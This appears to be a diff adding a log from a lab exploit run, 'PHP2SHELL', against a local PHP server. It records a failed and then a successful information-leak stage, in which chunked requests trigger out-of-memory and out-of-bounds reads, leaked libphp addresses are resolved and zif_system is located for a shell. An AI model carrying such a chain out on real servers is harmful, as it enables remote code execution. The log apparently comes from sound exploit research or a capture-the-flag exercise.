@@ -1,0 +1,25 @@
+
+=== 2026-10-23T03:47:34.368196+00:00 ===
+=== PHP2SHELL official target — pure HTTP ===
+target: https://127.0.0.1:18443/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+mode: single-worker chain
+      TLS bridge 127.0.0.1:40303 -> 127.0.0.1:18443 (sni=127.0.0.1, verify off)
+[*] leak-only: A1 + B1 (runtime address resolution)
+      A1 body generated; sending chunked END-cleanup OOM
+      B1 body generated; sending chunked stale-id OOB read
+[!] leak failed: RuntimeError('no Set-Cookie in leak response (309 bytes)')
+
+=== 2026-10-23T03:48:07.296447+00:00 ===
+=== PHP2SHELL official target — pure HTTP ===
+target: https://127.0.0.1:18443/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+mode: single-worker chain
+      TLS bridge 127.0.0.1:42807 -> 127.0.0.1:18443 (sni=127.0.0.1, verify off)
+[*] leak-only: A1 + B1 (runtime address resolution)
+      A1 body generated; sending chunked END-cleanup OOM
+      B1 body generated; sending chunked stale-id OOB read
+      decoded=819208 zval_ptr_dtor=0x7fbbc8399b60 -> libphp=0x7fbbc7d3b000
+      chunk buckets: [('0x7fbbc5a00000', 7495), ('0x7fbbc8200000', 1095), ('0x7fbbc6000000', 87), ('0x7fbbc5800000', 79)]
+      main candidates: 0x7fbbc6000000(87), 0x7fbbc5800000(79)
+      zif_system candidates: 0x7fbbc81a0370, 0x7fbbc81a0370
